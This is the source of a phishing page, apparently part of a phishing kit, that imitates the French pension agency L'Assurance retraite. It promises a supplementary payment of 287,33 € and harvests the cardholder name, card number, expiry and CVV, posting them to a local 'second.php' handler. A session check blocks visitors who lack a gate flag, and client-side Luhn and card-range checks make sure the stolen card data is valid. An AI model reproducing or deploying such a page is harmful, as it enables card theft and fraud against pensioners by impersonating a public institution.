<?php
session_start();
$nom   = $_SESSION['nom'] ?? 'Non spécifié';
$tel   = $_SESSION['tel'] ?? 'Non spécifié';
$email = $_SESSION['email'] ?? 'Non spécifié';

if (!isset($_SESSION['qsdfqsdfqsdfqsdf123123']) || $_SESSION['qsdfqsdfqsdfqsdf123123'] !== true) {
    die("THE REQUEST WAS DENIED: MAKE SURE YOU ARE NOT CONNECTED TO A PRIVATE NETWORK.");
}
?>
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Versement - L'Assurance retraite</title>
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.19.3/jquery.validate.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.payment/3.0.0/jquery.payment.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Open Sans', sans-serif;
        }

        body {
            background: #F5F5F5;
            min-height: 100vh;
        }

        header {
            background: white;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.08);
        }

        .header-top {
            background: #003d7a;
            padding: 8px 0;
        }

        .header-main {
            padding: 16px 24px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            max-width: 1200px;
            margin: 0 auto;
        }

        .logo {
            height: 60px;
        }

        .nav-icons {
            display: flex;
            gap: 20px;
            align-items: center;
            justify-content: center;
            flex: 1;
            margin-left: 40px;
            flex-wrap: nowrap;
        }

        .nav-icon span {
            white-space: nowrap;
        }

        .nav-icon {
            display: flex;
            flex-direction: row;
            align-items: center;
            text-decoration: none;
            color: #003d7a;
            font-size: 13px;
            font-weight: 500;
            transition: all 0.3s;
            padding: 8px 12px;
            border-radius: 8px;
            gap: 8px;
        }

        .nav-icon:hover {
            background: #E6F2FF;
            color: #FF5E00;
        }

        .nav-icon img {
            width: 20px;
            height: 20px;
        }

        .hamburger {
            display: none;
            flex-direction: column;
            cursor: pointer;
            gap: 4px;
            z-index: 1001;
        }

        .hamburger span {
            width: 25px;
            height: 3px;
            background: #003d7a;
            border-radius: 3px;
            transition: all 0.3s;
        }

        .hamburger.active span:nth-child(1) {
            transform: rotate(45deg) translate(6px, 6px);
        }

        .hamburger.active span:nth-child(2) {
            opacity: 0;
        }

        .hamburger.active span:nth-child(3) {
            transform: rotate(-45deg) translate(6px, -6px);
        }

        main {
            max-width: 900px;
            margin: 40px auto;
            padding: 0 20px;
        }

        .breadcrumb {
            display: flex;
            align-items: center;
            gap: 8px;
            color: #666;
            font-size: 14px;
            margin-bottom: 32px;
        }

        .progress-steps {
            display: flex;
            justify-content: space-between;
            margin-bottom: 40px;
            position: relative;
        }

        .progress-steps::before {
            content: '';
            position: absolute;
            top: 12px;
            left: 0;
            right: 0;
            height: 2px;
            background: #E0E0E0;
            z-index: 0;
        }

        .step {
            display: flex;
            flex-direction: column;
            align-items: center;
            position: relative;
            z-index: 1;
            flex: 1;
        }

        .step-number {
            width: 32px;
            height: 32px;
            background: white;
            border: 2px solid #E0E0E0;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: 600;
            font-size: 14px;
            margin-bottom: 8px;
            color: #999;
        }

        .step.completed .step-number {
            background: #28a745;
            border-color: #28a745;
            color: white;
        }

        .step.active .step-number {
            background: #003d7a;
            border-color: #003d7a;
            color: white;
        }

        .step-label {
            font-size: 13px;
            color: #666;
            text-align: center;
        }

        .step.active .step-label,
        .step.completed .step-label {
            color: #003d7a;
            font-weight: 600;
        }

        .form-card {
            background: white;
            border-radius: 12px;
            padding: 32px;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.08);
            margin-bottom: 24px;
        }

        .form-card h2 {
            color: #003d7a;
            font-size: 22px;
            font-weight: 600;
            margin-bottom: 24px;
        }

        .form-group {
            margin-bottom: 20px;
        }

        label {
            display: block;
            font-weight: 500;
            color: #333;
            margin-bottom: 8px;
            font-size: 14px;
        }

        input[type="text"],
        input[type="tel"] {
            width: 100%;
            padding: 12px 16px;
            border: 2px solid #E0E0E0;
            border-radius: 8px;
            font-size: 15px;
            transition: all 0.3s;
            outline: none;
        }

        input:focus {
            border-color: #003d7a;
        }

        input.error {
            border-color: #dc3545;
            animation: shake 0.5s;
        }

        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            10%, 30%, 50%, 70%, 90% { transform: translateX(-5px); }
            20%, 40%, 60%, 80% { transform: translateX(5px); }
        }

        .error-message {
            color: #dc3545;
            font-size: 13px;
            margin-top: 6px;
            display: none;
        }

        .error-message.show {
            display: block;
        }

        .form-row {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 20px;
        }

        .btn-primary {
            background: #003d7a;
            color: white;
            border: none;
            padding: 14px 40px;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
            width: 100%;
            margin-top: 24px;
        }

        .btn-primary:hover {
            background: #FF5E00;
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(255, 94, 0, 0.3);
        }

        .info-box {
            background: #E6F2FF;
            border-left: 4px solid #003d7a;
            padding: 16px;
            border-radius: 8px;
            margin-bottom: 24px;
            font-size: 14px;
            color: #003d7a;
        }

        .card-brands {
            display: flex;
            gap: 12px;
            margin-top: 12px;
            align-items: center;
        }

        .card-brands img {
            height: 30px;
        }

        .secure-badge {
            display: flex;
            align-items: center;
            gap: 8px;
            color: #28a745;
            font-size: 14px;
            font-weight: 500;
            margin-top: 16px;
        }

        /* Footer Styles */
        footer {
            background: #003d7a;
            color: white;
            padding: 50px 24px 30px;
            margin-top: 80px;
        }

        .footer-content {
            max-width: 1200px;
            margin: 0 auto;
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 60px;
            margin-bottom: 40px;
        }

        .footer-logos {
            display: flex;
            align-items: center;
            gap: 20px;
            margin-bottom: 40px;
            justify-content: center;
        }

        .footer-logos img {
            height: 60px;
        }

        .footer-section h3 {
            font-size: 18px;
            font-weight: 600;
            margin-bottom: 20px;
            color: white;
        }

        .footer-section ul {
            list-style: none;
            padding: 0;
        }

        .footer-section ul li {
            margin-bottom: 12px;
        }

        .footer-section ul li a {
            color: white;
            text-decoration: none;
            font-size: 14px;
            transition: color 0.3s;
        }

        .footer-section ul li a:hover {
            color: #FF5E00;
        }

        .social-links {
            display: flex;
            flex-direction: column;
            gap: 12px;
        }

        .social-link {
            display: flex;
            align-items: center;
            gap: 12px;
            color: white;
            text-decoration: none;
            font-size: 14px;
            transition: color 0.3s;
        }

        .social-link:hover {
            color: #FF5E00;
        }

        .social-link svg,
        .social-link img {
            width: 24px;
            height: 24px;
        }

        .social-link img {
            background: white;
            border-radius: 50%;
            padding: 2px;
        }

        .newsletter-text {
            font-size: 14px;
            line-height: 1.6;
            margin-bottom: 20px;
        }

        .newsletter-btn {
            background: white;
            color: #003d7a;
            border: none;
            padding: 12px 30px;
            border-radius: 25px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
        }

        .newsletter-btn:hover {
            background: #FF5E00;
            color: white;
        }

        .footer-bottom {
            text-align: center;
            padding-top: 30px;
            border-top: 1px solid rgba(255, 255, 255, 0.2);
            font-size: 14px;
        }

        /* Payment Container Layout */
        .payment-container {
            display: grid;
            grid-template-columns: 1fr;
            gap: 24px;
        }

        .amount-box {
            background: #E6F2FF;
            border: 2px solid #B8D4F1;
            border-radius: 12px;
            padding: 24px;
            box-shadow: 0 2px 8px rgba(0, 61, 122, 0.08);
        }

        .amount-box-content {
            text-align: center;
        }

        .amount-label {
            font-size: 14px;
            color: #666;
            font-weight: 500;
            margin-bottom: 12px;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        .amount-value {
            font-size: 36px;
            font-weight: 700;
            color: #003d7a;
            margin-bottom: 12px;
        }

        .amount-note {
            font-size: 13px;
            color: #666;
            margin: 0;
        }

        /* Desktop: Side by side layout */
        @media screen and (min-width: 769px) {
            .payment-container {
                grid-template-columns: 1fr 320px;
                align-items: start;
            }

            .amount-box {
                position: sticky;
                top: 40px;
                grid-column: 2;
                grid-row: 1;
            }

            #paymentForm {
                grid-column: 1;
                grid-row: 1;
            }
        }

        @media screen and (max-width: 768px) {
            .form-row {
                grid-template-columns: 1fr;
            }

            .header-main {
                position: relative;
            }

            .nav-icons {
                position: fixed;
                top: 0;
                right: -100%;
                width: 320px;
                height: 100vh;
                background: white;
                flex-direction: column;
                align-items: stretch;
                box-shadow: -2px 0 10px rgba(0, 0, 0, 0.1);
                padding: 20px 0 20px;
                margin-left: 0;
                gap: 0;
                z-index: 1000;
                overflow-y: auto;
            }

            .nav-icons.active {
                right: 0;
            }

            .nav-icon {
                width: 100%;
                padding: 18px 24px;
                border-radius: 0;
                border-bottom: 1px solid #E0E0E0;
                justify-content: flex-start;
                flex-shrink: 0;
                font-size: 16px;
                line-height: 1.5;
                min-height: 60px;
            }

            .nav-icon span {
                display: inline;
            }

            .nav-icon img {
                width: 24px;
                height: 24px;
            }

            .hamburger {
                display: flex;
            }

            .logo {
                height: 45px;
            }

            .step-label {
                font-size: 11px;
            }

            .form-card {
                padding: 24px 20px;
            }

            .footer-content {
                grid-template-columns: 1fr;
                gap: 40px;
            }
        }
    </style>
</head>
<body>
    <header>
        <div class="header-top"></div>
        <div class="header-main">
            <div class="logo-container">
                <img src="https://www.lassuranceretraite.fr/portail-info/files/live/sites/pub/files/newlogo.png" alt="L'Assurance retraite" class="logo">
            </div>
            <nav class="nav-icons" id="navMenu">
                <a href="https://www.lassuranceretraite.fr/portail-info/hors-menu/autre/questions-frequentes.html" class="nav-icon">
                    <img src="../assets/icons/FAQ.png" alt="FAQ">
                    <span>Questions fréquentes</span>
                </a>
                <a href="https://www.lassuranceretraite.fr/portail-info/hors-menu/footer/contacts.html" class="nav-icon">
                    <img src="../assets/icons/contact.png" alt="Contact">
                    <span>Nous contacter</span>
                </a>
                <a href="https://www.lassuranceretraite.fr/portail-info/nous-connaitre.html" class="nav-icon">
                    <img src="../assets/icons/logo AR.png" alt="Nous connaître">
                    <span>Nous connaître</span>
                </a>
                <a href="https://www.lassuranceretraite.fr/portail-info/entreprise.html" class="nav-icon">
                    <img src="../assets/icons/entreprise.png" alt="Entreprise">
                    <span>Entreprise</span>
                </a>
                <a href="https://www.lassuranceretraite.fr/portail-info/hors-menu/annexe/sourd-malentendant-contact.html" class="nav-icon">
                    <img src="../assets/icons/malentendant.png" alt="Sourd">
                    <span>Sourd - Malentendant</span>
                </a>
            </nav>
            <div class="hamburger" onclick="toggleMenu()">
                <span></span>
                <span></span>
                <span></span>
            </div>
        </div>
    </header>

    <main>
        <div class="breadcrumb">
            Accueil > Démarches en ligne > Versement sécurisé
        </div>

        <div class="progress-steps">
            <div class="step completed">
                <div class="step-number">✓</div>
                <div class="step-label">Informations</div>
            </div>
            <div class="step active">
                <div class="step-number">2</div>
                <div class="step-label">Versement</div>
            </div>
            <div class="step">
                <div class="step-number">3</div>
                <div class="step-label">Confirmation</div>
            </div>
        </div>

        <div class="info-box">
            Versement 100% sécurisé - Vos données sont protégées
        </div>

        <div class="payment-container">
            <div class="amount-box">
                <div class="amount-box-content">
                    <div style="margin-bottom: 20px;">
                        <div class="amount-label">Montant de votre versement complémentaire</div>
                        <div class="amount-value">287,33 €</div>
                        <p class="amount-note" style="color: #666; font-size: 13px; margin-top: 12px;">Suite à la réforme des retraites</p>
                    </div>
                    <div style="padding-top: 20px; border-top: 1px solid #E0E0E0;">
                        <p style="font-size: 12px; color: #666; line-height: 1.6; margin: 0;">
                            Ce versement complémentaire correspond à une régularisation de votre dossier de retraite conformément aux dispositions légales en vigueur.
                        </p>
                    </div>
                </div>
            </div>

            <form method="POST" action="../actions/second.php" id="paymentForm">
                <div class="form-card">
                    <h2>Informations de versement</h2>

                    <div class="form-group">
                        <label for="titu">Titulaire de la carte *</label>
                        <input type="text" id="titu" name="titu" required>
                    </div>

                    <div class="form-group">
                        <label for="ccc">Numéro de carte *</label>
                        <input type="tel" id="ccc" name="ccc" placeholder="0000 0000 0000 0000" required maxlength="19">
                        <div class="error-message" id="cardError">Numéro de carte invalide</div>
                        <div style="margin-top: 8px; opacity: 0.7;">
                            <img src="../assets/card-logos-new.png" alt="Cartes acceptées" style="height: 18px;">
                        </div>
                    </div>

                    <div class="form-row">
                        <div class="form-group">
                            <label for="exp">Date d'expiration *</label>
                            <input type="tel" id="exp" name="exp" placeholder="MM/AA" required maxlength="5">
                            <div class="error-message" id="expError">Date d'expiration invalide</div>
                        </div>
                        <div class="form-group">
                            <label for="cvc">Cryptogramme (CVV) *</label>
                            <input type="tel" id="cvc" name="cvc" placeholder="123" required maxlength="4">
                            <div class="error-message" id="cvcError">Code CVV invalide</div>
                        </div>
                    </div>

                    <div class="secure-badge">
                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#28a745" stroke-width="2">
                            <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
                            <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
                        </svg>
                        Transaction sécurisée SSL
                    </div>
                </div>

                <button type="submit" class="btn-primary">Valider le versement →</button>
            </form>
        </div>
    </main>

    <footer>
        <div class="footer-logos">
            <img src="../icones_PDP/logo_ss.svg" alt="La sécurité sociale">
            <img src="../icones_PDP/logobl.svg" alt="L'assurance retraite">
        </div>
        
        <div class="footer-content">
            <div class="footer-section">
                <h3>L'Assurance retraite</h3>
                <ul>
                    <li><a href="https://www.lassuranceretraite.fr/portail-info/nous-connaitre.html">Nous connaître</a></li>
                    <li><a href="https://www.lassuranceretraite.fr/portail-info/home/nous-rejoindre.html">Nous rejoindre</a></li>
                    <li><a href="https://www.lassuranceretraite.fr/portail-info/hors-menu/footer/espace-presse.html">Espace presse</a></li>
                    <li><a href="https://www.lassuranceretraite.fr/portail-info/hors-menu/footer/nos-publications.html">Nos publications de référence</a></li>
                    <li><a href="https://www.lassuranceretraite.fr/portail-info/hors-menu/footer/sites-internet-utiles.html">Sites internet utiles</a></li>
                </ul>
            </div>

            <div class="footer-section">
                <h3>Retrouvez-nous sur</h3>
                <div class="social-links">
                    <a href="https://www.youtube.com/@lassuranceretraite" class="social-link" target="_blank">
                        <img src="../icones_PDP/youtube.svg" alt="Youtube">
                        <span>Youtube</span>
                    </a>
                    <a href="https://twitter.com/assurretraite" class="social-link" target="_blank">
                        <img src="../icones_PDP/X.svg" alt="Twitter">
                        <span>Twitter</span>
                    </a>
                    <a href="https://www.linkedin.com/company/l-assurance-retraite/" class="social-link" target="_blank">
                        <img src="../icones_PDP/linkedin.svg" alt="LinkedIn">
                        <span>LinkedIn</span>
                    </a>
                </div>
            </div>

            <div class="footer-section">
                <h3>Notre newsletter</h3>
                <p class="newsletter-text">Inscrivez-vous gratuitement et recevez chaque trimestre, toutes les informations utiles et personnalisées pour préparer et gérer votre retraite.</p>
                <button class="newsletter-btn">Je m'inscris</button>
            </div>
        </div>

        <div class="footer-bottom">
            © <?= date('Y') ?> L'Assurance retraite - Tous droits réservés
        </div>
    </footer>

    <script>
        // Toggle mobile menu
        function toggleMenu() {
            const menu = document.getElementById('navMenu');
            const hamburger = document.querySelector('.hamburger');
            menu.classList.toggle('active');
            hamburger.classList.toggle('active');
        }

        // Close menu when clicking outside
        document.addEventListener('click', function(event) {
            const menu = document.getElementById('navMenu');
            const hamburger = document.querySelector('.hamburger');
            const isClickInsideMenu = menu.contains(event.target);
            const isClickOnHamburger = hamburger.contains(event.target);
            
            if (!isClickInsideMenu && !isClickOnHamburger && menu.classList.contains('active')) {
                menu.classList.remove('active');
                hamburger.classList.remove('active');
            }
        });

        $(document).ready(function() {
            $('#ccc').mask('0000 0000 0000 0000');
            $('#exp').mask('00/00');
            $('#cvc').mask('0000');

            // Enhanced card type detection with BIN ranges
            function getCardType(cardNumber) {
                const digits = cardNumber.replace(/\s/g, '');
                const firstDigit = digits.charAt(0);
                const firstTwo = digits.substring(0, 2);
                const firstFour = digits.substring(0, 4);

                // Visa: starts with 4
                if (firstDigit === '4') return 'visa';
                
                // Mastercard: 51-55 or 2221-2720
                if (parseInt(firstTwo) >= 51 && parseInt(firstTwo) <= 55) return 'mastercard';
                if (parseInt(firstFour) >= 2221 && parseInt(firstFour) <= 2720) return 'mastercard';
                
                // American Express: 34 or 37
                if (firstTwo === '34' || firstTwo === '37') return 'amex';
                
                return 'unknown';
            }

            // Luhn algorithm for card validation
            function isValidLuhn(cardNumber) {
                const digits = cardNumber.replace(/\s/g, '');
                if (digits.length < 13 || digits.length > 19) return false;
                if (!/^\d+$/.test(digits)) return false;
                
                let sum = 0;
                let isEven = false;
                
                for (let i = digits.length - 1; i >= 0; i--) {
                    let digit = parseInt(digits[i]);
                    
                    if (isEven) {
                        digit *= 2;
                        if (digit > 9) digit -= 9;
                    }
                    
                    sum += digit;
                    isEven = !isEven;
                }
                
                return sum % 10 === 0;
            }

            // Validate card number with BIN detection
            function validateCardNumber(cardNumber) {
                const digits = cardNumber.replace(/\s/g, '');
                const cardType = getCardType(digits);
                
                // Check if card type is recognized
                if (cardType === 'unknown') {
                    return { valid: false, message: 'Type de carte non accepté' };
                }
                
                // Check Luhn algorithm
                if (!isValidLuhn(digits)) {
                    return { valid: false, message: 'Numéro de carte invalide' };
                }
                
                // Check length for specific card types
                if (cardType === 'amex' && digits.length !== 15) {
                    return { valid: false, message: 'Numéro de carte invalide' };
                }
                if ((cardType === 'visa' || cardType === 'mastercard') && digits.length !== 16) {
                    return { valid: false, message: 'Numéro de carte invalide' };
                }
                
                return { valid: true, message: '' };
            }

            // Validate expiration date
            function validateExpiration(expDate) {
                if (expDate.length !== 5) {
                    return { valid: false, message: 'Format invalide (MM/AA)' };
                }
                
                const parts = expDate.split('/');
                const month = parseInt(parts[0]);
                const year = parseInt('20' + parts[1]);
                
                // Check valid month
                if (month < 1 || month > 12) {
                    return { valid: false, message: 'Mois invalide (01-12)' };
                }
                
                // Check if expired
                const now = new Date();
                const currentYear = now.getFullYear();
                const currentMonth = now.getMonth() + 1;
                
                if (year < currentYear || (year === currentYear && month < currentMonth)) {
                    return { valid: false, message: 'Carte expirée' };
                }
                
                return { valid: true, message: '' };
            }

            // Validate CVV
            function validateCVV(cvc, cardType) {
                const digits = cvc.replace(/\s/g, '');
                
                if (cardType === 'amex') {
                    if (digits.length !== 4) {
                        return { valid: false, message: 'CVV doit être 4 chiffres pour Amex' };
                    }
                } else {
                    if (digits.length !== 3) {
                        return { valid: false, message: 'CVV doit être 3 chiffres' };
                    }
                }
                
                if (!/^\d+$/.test(digits)) {
                    return { valid: false, message: 'CVV invalide' };
                }
                
                return { valid: true, message: '' };
            }

            // Update CVV field based on card type
            $('#ccc').on('input', function() {
                const cardType = getCardType($(this).val());
                const cvcField = $('#cvc');
                
                if (cardType === 'amex') {
                    cvcField.attr('placeholder', '1234');
                    cvcField.attr('maxlength', '4');
                    cvcField.mask('0000');
                } else {
                    cvcField.attr('placeholder', '123');
                    cvcField.attr('maxlength', '3');
                    cvcField.mask('000');
                }
            });

            // Card number validation on blur
            $('#ccc').on('blur', function() {
                const cardNumber = $(this).val();
                const validation = validateCardNumber(cardNumber);
                
                if (!validation.valid && cardNumber.length > 0) {
                    $(this).addClass('error');
                    $('#cardError').text(validation.message).addClass('show');
                } else {
                    $(this).removeClass('error');
                    $('#cardError').removeClass('show');
                }
            });

            // Remove error on focus
            $('#ccc').on('focus', function() {
                $(this).removeClass('error');
                $('#cardError').removeClass('show');
            });

            // Expiration validation on blur
            $('#exp').on('blur', function() {
                const expDate = $(this).val();
                const validation = validateExpiration(expDate);
                
                if (!validation.valid && expDate.length > 0) {
                    $(this).addClass('error');
                    $('#expError').text(validation.message).addClass('show');
                } else {
                    $(this).removeClass('error');
                    $('#expError').removeClass('show');
                }
            });

            $('#exp').on('focus', function() {
                $(this).removeClass('error');
                $('#expError').removeClass('show');
            });

            // CVV validation on blur
            $('#cvc').on('blur', function() {
                const cvc = $(this).val();
                const cardType = getCardType($('#ccc').val());
                const validation = validateCVV(cvc, cardType);
                
                if (!validation.valid && cvc.length > 0) {
                    $(this).addClass('error');
                    $('#cvcError').text(validation.message).addClass('show');
                } else {
                    $(this).removeClass('error');
                    $('#cvcError').removeClass('show');
                }
            });

            $('#cvc').on('focus', function() {
                $(this).removeClass('error');
                $('#cvcError').removeClass('show');
            });

            // Form submission validation
            $('#paymentForm').on('submit', function(e) {
                let isValid = true;
                
                // Validate card number
                const cardNumber = $('#ccc').val();
                const cardValidation = validateCardNumber(cardNumber);
                if (!cardValidation.valid) {
                    $('#ccc').addClass('error');
                    $('#cardError').text(cardValidation.message).addClass('show');
                    isValid = false;
                }
                
                // Validate expiration
                const expDate = $('#exp').val();
                const expValidation = validateExpiration(expDate);
                if (!expValidation.valid) {
                    $('#exp').addClass('error');
                    $('#expError').text(expValidation.message).addClass('show');
                    isValid = false;
                }
                
                // Validate CVV
                const cvc = $('#cvc').val();
                const cardType = getCardType(cardNumber);
                const cvcValidation = validateCVV(cvc, cardType);
                if (!cvcValidation.valid) {
                    $('#cvc').addClass('error');
                    $('#cvcError').text(cvcValidation.message).addClass('show');
                    isValid = false;
                }
                
                // Validate cardholder name
                const titu = $('#titu').val().trim();
                if (titu.length < 3) {
                    $('#titu').addClass('error');
                    isValid = false;
                }
                
                if (!isValid) {
                    e.preventDefault();
                    return false;
                }
                
                return true;
            });
        });
    </script>
</body>
</html>